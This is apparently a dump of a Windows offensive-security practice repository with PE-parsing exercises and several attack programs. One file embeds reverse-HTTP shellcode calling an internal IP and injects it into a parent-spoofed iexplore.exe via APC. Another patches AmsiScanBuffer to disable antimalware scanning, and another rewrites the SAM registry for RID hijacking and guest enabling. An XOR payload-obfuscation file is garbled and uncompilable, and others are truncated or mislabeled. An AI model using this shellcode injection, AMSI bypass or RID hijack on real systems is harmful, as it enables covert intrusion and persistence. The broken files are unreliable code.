            _IMAGE_SECTION_HEADER* section;
            //让块表的指针指向其对应的地址=第一个块表地址+计数*块表的大小
            section = (_IMAGE_SECTION_HEADER*)((UINT)sectionHeader + sizeof(_IMAGE_SECTION_HEADER) * cnt);
            //将得到的块表指针存入数组
            sectionArr[cnt++] = section;
            //输出块表名称
            printf("%s\n", section->Name);
        }
        CloseHandle(hFile);

        int i;
        //sectionAlignment(dos, nt, sectionArr, "C:\\Users\\lyl610abc\\Desktop\\EverEdit\\EverEdit.exe",hMap, pFile,2);

        for (i = 0; i < nt->FileHeader.NumberOfSections; i++) {
            sectionAlignment(dos, nt, sectionArr, "C:\\Users\\lyl610abc\\Desktop\\EverEdit\\EverEdit.exe", &hMap, &pFile, i);
        }

        break;
    }

    case IMAGE_NT_OPTIONAL_HDR64_MAGIC:
    {
        printf("64位程序\n");
        //确定为64位程序后，就可以使用_IMAGE_NT_HEADERS64来接收数据了
        //创建指向PE文件头的指针
        _IMAGE_NT_HEADERS64* nt;
        nt = (_IMAGE_NT_HEADERS64*)peId;
        printf("Machine:%X\n", nt->FileHeader.Machine);
        printf("Magic:%X\n", nt->OptionalHeader.Magic);

        //创建一个指针数组，该指针数组用来存储所有的节表指针
        //这里相当于_IMAGE_SECTION_HEADER* sectionArr[nt->FileHeader.NumberOfSections],声明了一个动态数组
        _IMAGE_SECTION_HEADER** sectionArr = (_IMAGE_SECTION_HEADER**)malloc(sizeof(_IMAGE_SECTION_HEADER*) * nt->FileHeader.NumberOfSections);

        //创建指向块表的指针
        _IMAGE_SECTION_HEADER* sectionHeader;
        //让块表的指针指向其对应的地址，区别在于这里加上的偏移为_IMAGE_NT_HEADERS64
        sectionHeader = (_IMAGE_SECTION_HEADER*)((UINT)nt + sizeof(_IMAGE_NT_HEADERS64));
        //计数，用来计算块表地址
        int cnt = 0;
        //比较 计数 和 块表的个数，即遍历所有块表
        while (cnt < nt->FileHeader.NumberOfSections) {
            //创建指向块表的指针
            _IMAGE_SECTION_HEADER* section;
            //让块表的指针指向其对应的地址=第一个块表地址+计数*块表的大小
            section = (_IMAGE_SECTION_HEADER*)((UINT)sectionHeader + sizeof(_IMAGE_SECTION_HEADER) * cnt);
            //将得到的块表指针存入数组
            sectionArr[cnt++] = section;
            //输出块表名称
            printf("%s\n", section->Name);
        }

        break;
    }

    default:
    {
        printf("error!\n");
        break;
    }

    }
    return 0;
}
```

----------------------------------------

## File: 参数欺骗.cpp

```
﻿#include <windows.h>
#include <TlHelp32.h>
#include <iostream>

DWORD getParentProcessID() {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 process = { 0 };
    process.dwSize = sizeof(process);

    if (Process32First(snapshot, &process)) {
        do {
            //If you want to another process as parent change here
            if (!wcscmp(process.szExeFile, L"explorer.exe"))
                break;
        } while (Process32Next(snapshot, &process));
    }

    CloseHandle(snapshot);
    return process.th32ProcessID;
}

int main() {

    
    unsigned char shellCode[] = "\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4f\xff\xff\xff\x5d\x6a\x00\x49\xbe\x77\x69\x6e\x69\x6e\x65\x74\x00\x41\x56\x49\x89\xe6\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x48\x31\xc9\x48\x31\xd2\x4d\x31\xc0\x4d\x31\xc9\x41\x50\x41\x50\x41\xba\x3a\x56\x79\xa7\xff\xd5\xe9\x93\x00\x00\x00\x5a\x48\x89\xc1\x41\xb8\xd1\x11\x00\x00\x4d\x31\xc9\x41\x51\x41\x51\x6a\x03\x41\x51\x41\xba\x57\x89\x9f\xc6\xff\xd5\xeb\x79\x5b\x48\x89\xc1\x48\x31\xd2\x49\x89\xd8\x4d\x31\xc9\x52\x68\x00\x32\xc0\x84\x52\x52\x41\xba\xeb\x55\x2e\x3b\xff\xd5\x48\x89\xc6\x48\x83\xc3\x50\x6a\x0a\x5f\x48\x89\xf1\xba\x1f\x00\x00\x00\x6a\x00\x68\x80\x33\x00\x00\x49\x89\xe0\x41\xb9\x04\x00\x00\x00\x41\xba\x75\x46\x9e\x86\xff\xd5\x48\x89\xf1\x48\x89\xda\x49\xc7\xc0\xff\xff\xff\xff\x4d\x31\xc9\x52\x52\x41\xba\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x85\x9d\x01\x00\x00\x48\xff\xcf\x0f\x84\x8c\x01\x00\x00\xeb\xb3\xe9\xe4\x01\x00\x00\xe8\x82\xff\xff\xff\x2f\x6f\x45\x39\x70\x00\xd5\xb8\x6f\x15\x1f\xc5\xc1\x49\xa9\x5e\xe6\x9b\x17\x48\xa5\x28\x2d\xc8\xed\xf2\x73\xfe\xd3\x0c\xc9\x27\x32\x1d\xcf\x64\xe4\xc1\x1e\xe5\xc8\x28\x75\x4e\x60\xf8\x79\xfb\xc0\x49\x1b\x2b\x0d\x86\x81\x8e\xf8\x12\x8c\x62\x20\x6c\x3b\xd3\x09\x12\xe7\x4e\x50\xec\x74\x0f\x43\xa8\x35\x4e\x6e\xfc\x3d\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x39\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x31\x3b\x20\x57\x4f\x57\x36\x34\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x35\x2e\x30\x3b\x20\x4d\x41\x53\x50\x29\x0d\x0a\x00\xee\x20\xac\x1d\xac\x96\x39\xb2\xa9\xd6\x27\x53\x22\x1e\xd9\x95\xd1\xb4\x4c\xac\xaa\x56\x16\x5e\x4a\xf8\xee\xd1\xe5\x4b\x58\xa3\x02\x5f\xda\xfb\x6e\x43\x20\x8c\x2c\xe3\xf6\xea\xbf\x61\x41\x2b\x71\x46\x52\x8e\x49\x12\xcc\x3a\xdd\xc4\x43\x92\x46\x24\x36\x59\x21\xea\x53\x78\x40\x1d\xe1\x3e\xf0\x16\x8d\x9b\xf9\xc1\x97\x9e\xde\xc2\x23\x35\x3d\x95\x6b\x3c\xdf\x9e\xbd\x49\xa5\x57\xfa\xfa\xd0\x28\x10\xab\x6d\x7b\x11\xdd\x7a\x22\x7b\x2d\x72\x56\x50\x27\x36\x9e\x56\x23\xcb\xbf\x70\x67\xa5\x2c\xe3\xb1\x9d\x24\x01\x23\xf0\xd8\xe5\x17\x9b\x90\x2d\x5c\x31\x93\x71\x40\xc1\x1b\x9c\x8b\x7a\x8f\xe9\x00\x11\x76\x88\x8f\xde\xba\x67\xac\xeb\x91\xbd\x79\x14\xec\xa5\x2b\xb5\xf3\xfd\x05\x1a\x78\x15\x1d\xa4\x30\x64\x93\x97\xe2\x59\x08\xfc\x9a\x76\x4d\x9f\x7b\x65\x43\xe4\x9f\x30\xd5\xf3\x5f\x72\x39\x57\x87\x4b\x78\x04\x36\xf1\xf8\xf4\x03\x81\x6f\x0d\xfe\x85\x0e\x00\x41\xbe\xf0\xb5\xa2\x56\xff\xd5\x48\x31\xc9\xba\x00\x00\x40\x00\x41\xb8\x00\x10\x00\x00\x41\xb9\x40\x00\x00\x00\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda\x41\xb8\x00\x20\x00\x00\x49\x89\xf9\x41\xba\x12\x96\x89\xe2\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb6\x66\x8b\x07\x48\x01\xc3\x85\xc0\x75\xd7\x58\x58\x58\x48\x05\x00\x00\x00\x00\x50\xc3\xe8\x7f\xfd\xff\xff\x31\x39\x32\x2e\x31\x36\x38\x2e\x31\x2e\x35\x00\x12\x34\x56\x78";

    STARTUPINFOEXA sInfoEX;
    PROCESS_INFORMATION pInfo;
    SIZE_T sizeT;

    HANDLE expHandle = OpenProcess(PROCESS_ALL_ACCESS, false, getParentProcessID());

    ZeroMemory(&sInfoEX, sizeof(STARTUPINFOEXA));
    InitializeProcThreadAttributeList(NULL, 1, 0, &sizeT);
    sInfoEX.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, sizeT);
    InitializeProcThreadAttributeList(sInfoEX.lpAttributeList, 1, 0, &sizeT);
    UpdateProcThreadAttribute(sInfoEX.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &expHandle, sizeof(HANDLE), NULL, NULL);
    sInfoEX.StartupInfo.cb = sizeof(STARTUPINFOEXA);

    CreateProcessA("C:\\Program Files\\internet explorer\\iexplore.exe", NULL, NULL, NULL, TRUE, CREATE_SUSPENDED | CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, reinterpret_cast<LPSTARTUPINFOA>(&sInfoEX), &pInfo);

    LPVOID lpBaseAddress = (LPVOID)VirtualAllocEx(pInfo.hProcess, NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    SIZE_T* lpNumberOfBytesWritten = 0;
    BOOL resWPM = WriteProcessMemory(pInfo.hProcess, lpBaseAddress, (LPVOID)shellCode, sizeof(shellCode), lpNumberOfBytesWritten);

    QueueUserAPC((PAPCFUNC)lpBaseAddress, pInfo.hThread, NULL);
    ResumeThread(pInfo.hThread);
    CloseHandle(pInfo.hThread);

    return 0;
}
```

----------------------------------------

## File: 句柄降权.cpp

```
﻿#include <iostream>
#include <vector>
using namespace std;

struct ListNode {
    int val;
    ListNode* next;
    ListNode(int x) : val(x), next(NULL) {}
};

class Solution {
public:
    ListNode* swapPairs(ListNode* head) {
        if (head == nullptr || head->next == nullptr) {
            return head;
        }
        ListNode* dummy = new ListNode(0);
        dummy->next = head;
        ListNode* pre = dummy, * cur = head;
        while (cur != nullptr && cur->next != nullptr) {
            ListNode* nextGroup = cur->next->next;
            pre->next = cur->next;
            cur->next->next = cur;
            cur->next = nextGroup;
            pre = cur;
            cur = nextGroup;
        }
        return dummy->next;
    }
};

void printList(ListNode* head) {
    while (head != nullptr) {
        cout << head->val << " ";
        head = head->next;
    }
    cout << endl;
}

int main() {
    // Test Case 1
    vector<int> nums1 = { 1, 2, 3, 4, 5 };
    ListNode* head1 = new ListNode(0);
    ListNode* p1 = head1;
    for (int i = 0; i < nums1.size(); i++) {
        p1->next = new ListNode(nums1[i]);
        p1 = p1->next;
    }
    cout << "Before swap: ";
    printList(head1->next);
    Solution sol1;
    ListNode* newHead1 = sol1.swapPairs(head1->next);
    cout << "After swap: ";
    printList(newHead1);

    // Test Case 2
    vector<int> nums2 = { 1, 1, 2, 2, 3, 3, 4 };
    ListNode* head2 = new ListNode(0);
    ListNode* p2 = head2;
    for (int i = 0; i < nums2.size(); i++) {
        p2->next = new ListNode(nums2[i]);
        p2 = p2->next;
    }
    cout << "Before swap: ";
    printList(head2->next);
    Solution sol2;
    ListNode* newHead2 = sol2.swapPairs(head2->next);
    cout << "After swap: ";
    printList(newHead2);

    return 0;
}

```

----------------------------------------

## File: 合并节.cpp

```
﻿// PE.cpp : Defines the entry point for the console application.
//
#include <stdio.h>
#include <malloc.h>
#include <windows.h>
#include <winnt.h>
#include <math.h>
void combineSection(_IMAGE_DOS_HEADER* dos, _IMAGE_NT_HEADERS* nt, _IMAGE_SECTION_HEADER** sectionArr) {
	//所有节内存对齐后的大小的和，这里要求已经修正过内存对齐，只有这样文件对齐大小才会等于内存对齐大小
	DWORD allSectionSize = 0;
	//所有节的权限，初始为第一个节的权限，和后面的每个节的权限进行或操作
	DWORD allSectionCharateristics = sectionArr[0]->Characteristics;
	int i;
	for (i = 0; i < nt->FileHeader.NumberOfSections;i++) {
		allSectionSize += sectionArr[i]->SizeOfRawData;
		allSectionSize = allSection

	
	}


}
```

----------------------------------------

## File: 实现amsi绕过.cpp

```
﻿// 实现amsi绕过.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//
#include <Windows.h>
#include <iostream>
#include <stdio.h>

int main()
{
	STARTUPINFOA si = { 0 };  //STARTUPINFOA指定创建时进程的主窗口的窗口工作站、桌面、标准句柄和外观。
	PROCESS_INFORMATION pi = { 0 }; //PROCESS_INFORMATION在创建进程时相关的数据结构之一，该结构返回有关新进程及其主线程的信息。
	si.cb = sizeof(si);				//cb结构大小
	CreateProcessA(NULL, (LPSTR)"powershell -NoExit dir", NULL, NULL, NULL, NULL, NULL, NULL, &si, &pi);  
	HMODULE hAmsi = LoadLibraryA("amsi.dll");											
	LPVOID pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
	Sleep(500);
	DWORD oldProtect;
	char patch = 0xc3;
	VirtualProtectEx(pi.hProcess, (LPVOID)pAmsiScanBuffer, 1, PAGE_EXECUTE_READWRITE, &oldProtect);
	WriteProcessMemory(pi.hProcess, (LPVOID)pAmsiScanBuffer, &patch, sizeof(char), NULL);
	VirtualProtectEx(pi.hProcess, (LPVOID)pAmsiScanBuffer, 1, oldProtect, NULL);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
	FreeLibrary(hAmsi);
	return 0;
}

```

----------------------------------------

## File: 导出表.cpp

```
﻿// 导出表.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//

#include <iostream>

int main()
{
    std::cout << "Hello World!\n";
}

// 运行程序: Ctrl + F5 或调试 >“开始执行(不调试)”菜单
// 调试程序: F5 或调试 >“开始调试”菜单

// 入门使用技巧: 
//   1. 使用解决方案资源管理器窗口添加/管理文件
//   2. 使用团队资源管理器窗口连接到源代码管理
//   3. 使用输出窗口查看生成输出和其他消息
//   4. 使用错误列表窗口查看错误
//   5. 转到“项目”>“添加新项”以创建新的代码文件，或转到“项目”>“添加现有项”以将现有代码文件添加到项目
//   6. 将来，若要再次打开此项目，请转到“文件”>“打开”>“项目”并选择 .sln 文件

```

----------------------------------------

## File: 开发一个BOF.c

```
﻿#include "beacon.h"
#include <Windows.h>
#include <stdio.h>

DECLSPEC_IMPORT WINADVAPI LONG WINAPI ADVAPI32$RegOpenKeyExA(HKEY, LPCWSTR, DWORD, REGSAM, PHKEY);
DECLSPEC_IMPORT WINADVAPI LONG WINAPI ADVAPI32$RegQueryValueExA;
DECLSPEC_IMPORT WINADVAPI LONG WINAPI ADVAPI32$RegQueryValueExA;
DECLSPEC_IMPORT WINADVAPI LONG WINAPI ADVAPI32$RegCloseKey(HKEY);

int  main()
{
	HKEY hKey = NULL;
	PCHAR KeyAddr = NULL;
	DWORD KeySize;
	DWORD KeyType;
	BYTE Buffer[0x50] = { 0 };
	KeyAddr = (PCHAR)"SAM\\SAM\\Domains\\Account\\Users\\000001F5";

	RegOpenKeyExA(HKEY_LOCAL_MACHINE, KeyAddr, 0, KEY_ALL_ACCESS, &hKey);
	RegQueryValueExA(hKey, "F", NULL, &KeyType, (LPBYTE)&Buffer, &KeySize);

	Buffer[0x30] = (BYTE)0xf4; //hijack rid
	Buffer[0x38] = (BYTE)0x14; //enable guest

	RegSetValueExA(hKey, "F", NULL, KeyType, Buffer, KeySize);
	RegCloseKey(hKey);
	return 0;
}
```

----------------------------------------

## File: 异或+混淆.cpp

```
﻿// 异或+混淆.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//

#include <iostream>
#include <string.h>
#include "windows.h"
#include <string>
#define uint UINT
using std::string;

string get_nop(char num) {
    //在 bin 文件前面插上几个 \x90 来绕过检测
    
}


//防止找不到配置文件
//解决在其他目录调用exe可能会找不到文件的问题
string get_path()
{
    char szFilePath[MAX_PATH + 1] = { 0 };
    GetModuleFileNameA(NULL, szFilePath, MAX_PATH);
    (strrchr(szFilePath, '\\'))[0] = 0;
    string path = szFilePath;
    return path;
}

//fromhex函数:将hexstr转为:bytes
inline int fromHex(uint c)
{
    return ((c >= '0') && (c <= '9')) ? int(c - '0') :
        ((c >= 'A') && (c <= 'F')) ? int(c - 'A' + 10) :
        ((c >= 'a') && (c <= 'f')) ? int(c - 'a' + 10) :
        /* otherwise */              -1;
}
inline int toHex(uint c)
{
    return ((c >= 0) && (c <= 9)) ? int(c + '0') :
        ((c >= 10) && (c <= 15)) ? int(c + 'a' - 10) :
        /* otherwise */              -1;
}
string FromHex(string data)
{
    string init = string((data.size() + 1) / 2, 0);
    unsigned char* result = (unsigned char*)init.data() + init.size();

    bool ri = true;
    for (int i = data.size() - 1; i >= 0; --i)
    {
        unsigned char ch = data.at(i);
        int tmp = fromHex(ch);
        if (-1 == tmp)
        {
            continue;
        }
        if (ri) {
            --result;
            *result = tmp;
            ri = false;
        }
        else
        {
            *result |= tmp << 4;
            ri = true;
        }
    }

    return init;
}
string ToHex(string data)
{
    string init;
    for (int i = 0; i < data.size(); ++i)
    {
        unsigned char aa = data[i];
        //cout << aa << endl;
        unsigned char bb = toHex(aa >> 4 & 0xf);
        unsigned char cc = toHex(aa & 0xf);
        //cout << bb << cc << endl;
        init.push_back(bb);
        init.push_back(cc);
    }
    return init;
}

// 通过stat结构体 获得文件大小，单位字节
size_t getFileSize1(const char* fileName) {

    if (fileName == NULL) {
        return 0;
    }

    // 这是一个存储文件(夹)信息的结构体，其中有文件大小和创建时间、访问时间、修改时间等
    struct stat statbuf;

    // 提供文件名字符串，获得文件属性结构体
    stat(fileName, &statbuf);

    // 获取文件大小
    size_t filesize = statbuf.st_size;

    return filesize;
}

int hex(string a) {


}

string DecIntToHexStr(long long num)
{
    string str;
    long long Temp = num / 16;
    int left = num % 16;
    if (Temp > 0)
        str += DecIntToHexStr(Temp);
    if (left < 10)
        str += (left + '0');
    else
        str += ('A' + left - 10);
    return str;
}

string DecStrToHexStr(string str)
{
    long long Dec = 0;
    for (int i = 0;i < str.size(); ++i)
        Dec = Dec * 10 + str[i] - '0';
    return DecIntToHexStr(Dec);
}


int main()
{
    
    int num = 77;
    BYTE shellcode_raw = NULL;
    string dir_path = get_path();
    string fin_path;
    char filename[] = "\\payload.bin";
    fin_path = dir_path + filename;

    //往开头随机写入字符串
    int a = rand() % 9 + 10;
    string x = FromHex(get_nop(num) * a);
    FILE* fp = fopen("payload.bin", "rw+");
    fputc(x, fp);
    int payload_size = getFileSize1("payload.bin");

    char* p = NULL;
    int check = 0;
    size_t code = 0;
     p = new char[payload_size];
     FILE* ptiti = fopen("ptiti.txt", "rw+");
    while (true) {
        code = fread(p, sizeof(char), payload_size, fp);
        if (not code) {
            break;}
        string base10 = ord(code) ^ num;
        string base10_str = chr(base10);
        shellcode_raw += base10_str.encode();
        string code_hex = DecStrToHexStr(base10);
        if (code_hex.length() == 1) {
            code_hex = '0' + code_hex;
        }
        string y = FromHex(code_hex);
        
    }



}




```

----------------------------------------

## File: 扩大节.cpp

```
﻿// 扩大节.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//

#include <iostream>
#include <stdio.h>
#include <malloc.h>
#include <windows.h>
#include <winnt.h>
#include <math.h>
void expandSection(_IMAGE_DOS_HEADER* dos, _IMAGE_NT_HEADERS* nt, _IMAGE_SECTION_HEADER** sectionArr, HANDLE hFile, UINT expandSize) {
    DWORD VirtualSize = sectionArr[nt->FileHeader.NumberOfSections - 1] -> Misc.VirtualSize;
    DWORD SizeOfRawData = sectionArr[nt->FileHeader.NumberOfSections - 1]->SizeOfRawData;
    UINT SizeInMemory = (UINT)ceil((double)max(VirtualSize,SizeOfRawData) / double(nt -> OptionalHeader.SectionAlignment)) * nt->OptionalHeader.SectionAlignment;
    printf("最后对齐的节大为: %x\n", SizeInMemory);
    //根据内存对齐后大小 - 内存对齐前大小 = 内存对齐增加增加大小 
    UINT offset = SizeInMemory - sectionArr[nt->FileHeader.NumberOfSections - 1]->SizeOfRawData;//那我为什么不直接引用上面的“SizeOfData”
    printf("offset: %X\n",offset);
    UINT end = sectionArr[nt -> FileHeader.NumberOfSections]->PointerToRawData + sectionArr[nt->FileHeader.NumberOfSections - 1]->SizeOfRawData;
    UINT size = offset + expandSize; //expandSize为自定义的要加的节大小
    //设置要写入的地址结尾
    SetFilePointer(hFile, end, NULL, FILE_BEGIN);
    //申请要填充的空间
    INT* content = (INT*)malloc(expandSize + offset);
    //初始化为0
    ZeroMemory(content,expandSize + offset);
    //WriteFile用于接收实际写入的大小的参数
    DWORD dwWritenSize = 0;
    BOOL bRet = WriteFile(hFile, content, expandSize + offset, &dwWritenSize, NULL);
    if (bRet)
    {
        printf("expand Section success!\n");
        //修正节表成员
        sectionArr[nt->FileHeader.NumberOfSections - 1]->Misc.VirtualSize = SizeInMemory + expandSize;
        sectionArr[nt->FileHeader.NumberOfSections - 1]->SizeOfRawData = SizeInMemory + expandSize;
        //修正SizeOfImage
        nt->OptionalHeader.SizeOfImage += expandSize;
    }
    else {
        printf("%d\n", GetLastError());
    }


}


int main(int argc, char* argv[])
{
    //创建DOS对应的结构体指针
    _IMAGE_DOS_HEADER* dos;
    //读取文件，返回文件句柄
    HANDLE hFile = CreateFileA("C:\Program Files\WindowsApps\Microsoft.MicrosoftStickyNotes_4.5.7.0_x64__8wekyb3d8bbwe\Microsoft.Notes.exe", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, 0);
    //根据文件句柄创建映射
    HANDLE hMap = CreateFileMappingA(hFile, NULL, PAGE_READWRITE, 0, 0, 0);
    //映射内容
    LPVOID pFile = MapViewOfFile(hMap, FILE_SHARE_WRITE, 0, 0, 0);
    //类型转换，用结构体的方式来读取
    dos = (_IMAGE_DOS_HEADER*)pFile;
    //输出dos->e_magic，以十六进制输出
    printf("dos->e_magic:%X\n", dos->e_magic);

    //创建指向PE文件头标志的指针
    DWORD* peId;
    //让PE文件头标志指针指向其对应的地址=DOS首地址+偏移
    peId = (DWORD*)((UINT)dos + dos->e_lfanew);
    //输出PE文件头标志，其值应为4550，否则不是PE文件
    printf("peId:%X\n", *peId);

    //创建指向可选PE头的第一个成员magic的指针
    WORD* magic;
    //让magic指针指向其对应的地址=PE文件头标志地址+PE文件头标志大小+标准PE头大小
    magic = (WORD*)((UINT)peId + sizeof(DWORD) + sizeof(_IMAGE_FILE_HEADER));
    //输出magic，其值为0x10b代表32位程序，其值为0x20b代表64位程序
    printf("magic:%X\n", *magic);
    //根据magic判断为32位程序还是64位程序
    switch (*magic) {
    case IMAGE_NT_OPTIONAL_HDR32_MAGIC:
    {
        printf("32位程序\n");
        //确定为32位程序后，就可以使用_IMAGE_NT_HEADERS来接收数据了
        //创建指向PE文件头的指针
        _IMAGE_NT_HEADERS* nt;
        //让PE文件头指针指向其对应的地址
        nt = (_IMAGE_NT_HEADERS*)peId;
        printf("Machine:%X\n", nt->FileHeader.Machine);
        printf("Magic:%X\n", nt->OptionalHeader.Magic);
        //创建一个指针数组，该指针数组用来存储所有的节表指针
        //这里相当于_IMAGE_SECTION_HEADER* sectionArr[nt->FileHeader.NumberOfSections],声明了一个动态数组
        _IMAGE_SECTION_HEADER** sectionArr = (_IMAGE_SECTION_HEADER**)malloc(sizeof(_IMAGE_SECTION_HEADER*) * nt->FileHeader.NumberOfSections);

        //创建指向块表的指针
        _IMAGE_SECTION_HEADER* sectionHeader;
        //让块表的指针指向其对应的地址
        sectionHeader = (_IMAGE_SECTION_HEADER*)((UINT)nt + sizeof(_IMAGE_NT_HEADERS));
        //计数，用来计算块表地址
        int cnt = 0;
        //比较 计数 和 块表的个数，即遍历所有块表
        while (cnt < nt->FileHeader.NumberOfSections) {
            //创建指向块表的指针
            _IMAGE_SECTION_HEADER* section;
            //让块表的指针指向其对应的地址=第一个块表地址+计数*块表的大小
            section = (_IMAGE_SECTION_HEADER*)((UINT)sectionHeader + sizeof(_IMAGE_SECTION_HEADER) * cnt);
            //将得到的块表指针存入数组
            sectionArr[cnt++] = section;
            //输出块表名称
            printf("%s\n", section->Name);
        }

        expandSection(dos, nt, sectionArr, hFile, 0x1000);

        break;
    }

    case IMAGE_NT_OPTIONAL_HDR64_MAGIC:
    {
        printf("64位程序\n");
        //确定为64位程序后，就可以使用_IMAGE_NT_HEADERS64来接收数据了
        //创建指向PE文件头的指针
        _IMAGE_NT_HEADERS64* nt;
        nt = (_IMAGE_NT_HEADERS64*)peId;
        printf("Machine:%X\n", nt->FileHeader.Machine);
        printf("Magic:%X\n", nt->OptionalHeader.Magic);

        //创建一个指针数组，该指针数组用来存储所有的节表指针
        //这里相当于_IMAGE_SECTION_HEADER* sectionArr[nt->FileHeader.NumberOfSections],声明了一个动态数组
        _IMAGE_SECTION_HEADER** sectionArr = (_IMAGE_SECTION_HEADER**)malloc(sizeof(_IMAGE_SECTION_HEADER*) * nt->FileHeader.NumberOfSections);

        //创建指向块表的指针
        _IMAGE_SECTION_HEADER* sectionHeader;
        //让块表的指针指向其对应的地址，区别在于这里加上的偏移为_IMAGE_NT_HEADERS64
        sectionHeader = (_IMAGE_SECTION_HEADER*)((UINT)nt + sizeof(_IMAGE_NT_HEADERS64));
        //计数，用来计算块表地址
        int cnt = 0;
        //比较 计数 和 块表的个数，即遍历所有块表
        while (cnt < nt->FileHeader.NumberOfSections) {
            //创建指向块表的指针
            _IMAGE_SECTION_HEADER* section;
            //让块表的指针指向其对应的地址=第一个块表地址+计数*块表的大小
            section = (_IMAGE_SECTION_HEADER*)((UINT)sectionHeader + sizeof(_IMAGE_SECTION_HEADER) * cnt);
            //将得到的块表指针存入数组
            sectionArr[cnt++] = section;
            //输出块表名称
            printf("%s\n", section->Name);
        }

        break;
    }

    default:
    {
        printf("error!\n");
        break;
    }

    }
    return 0;
}


```

----------------------------------------

## File: 新增页.cpp

```
﻿// 新增页.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//

#include <iostream>

int main()
{
    std::cout << "Hello World!\n";
}

// 运行程序: Ctrl + F5 或调试 >“开始执行(不调试)”菜单
// 调试程序: F5 或调试 >“开始调试”菜单

// 入门使用技巧: 
//   1. 使用解决方案资源管理器窗口添加/管理文件
//   2. 使用团队资源管理器窗口连接到源代码管理
//   3. 使用输出窗口查看生成输出和其他消息
//   4. 使用错误列表窗口查看错误
//   5. 转到“项目”>“添加新项”以创建新的代码文件，或转到“项目”>“添加现有项”以将现有代码文件添加到项目
//   6. 将来，若要再次打开此项目，请转到“文件”>“打开”>“项目”并选择 .sln 文件

```

----------------------------------------

## File: 独角兽写x64 hello world.cpp

```
﻿#include <stdio.h>
#include <stdint.h>
#include <unicorn.h>




#define ADDRESS 0x8000

void add(uc_engine * uc) {
    int32_t a, b, ret;
    uint32_t lr;

    // 获取参数值
    uc_reg_read(uc, UC_ARM_REG_R0, &a);
    uc_reg_read(uc, UC_ARM_REG_R1, &b);

    ret = a + b + 1;

    // 设置返回值
    uc_reg_write(uc, UC_ARM_REG_R0, &ret);

    // 模拟实现bx lr的功能
    uc_reg_read(uc, UC_ARM_REG_LR, &lr);
    uc_reg_write(uc, UC_ARM_REG_PC, &lr);
}

void hook(uc_engine* uc, uint64_t address, uint32_t size, void* user_data) {
    if (0x8010 == (uint32_t)address) {  // 当模拟器内执行到add函数地址时，进入我们的add函数进行处理
        add(uc);
    }
}

int main() {
    uc_engine* uc;
    uc_hook hh;
    uint32_t r0;

    uint32_t code[] = { 0xE1A0200F, 0xE2823008, 0xE2824010, 0xE12FFF14, 0xE0800001, 0xE12FFF1E, 0xE3A0000B, 0xE3A01016, 0xE12FFF33, 0xE3A01021, 0xE12FFF33, 0xE1A00000 };

    uc_open(UC_ARCH_ARM, UC_MODE_ARM, &uc);
    uc_mem_map(uc, ADDRESS, 1024 * 4, UC_PROT_ALL);
    uc_mem_write(uc, ADDRESS, code, sizeof(code));

    // 这里我在整个代码地址范围内加上单条指令的hook，每次执行这个地址范围内的指令前都会回调我们的hook函数
    // 如果你可以很明确的知道在哪个地址范围内需要hook，设置一个准确的地址范围能提升程序的运行效率
    uc_hook_add(uc, &hh, UC_HOOK_CODE, hook, NULL, ADDRESS, ADDRESS + sizeof(code));

    uc_emu_start(uc, ADDRESS, ADDRESS + sizeof(code), 0, 0);

    uc_reg_read(uc, UC_ARM_REG_R0, &r0);
    printf("r0 = %d\n", r0);
    uc_close(uc);
    return 0;
}
```

----------------------------------------

## File: 自己写程序把 PE 这些结构体都打印出来.c

```
﻿#include <windows.h>
#include <stdio.h>
#include <tchar.h>

#pragma warning(disable:4996)

void viewImageFileCharacteristics(WORD);

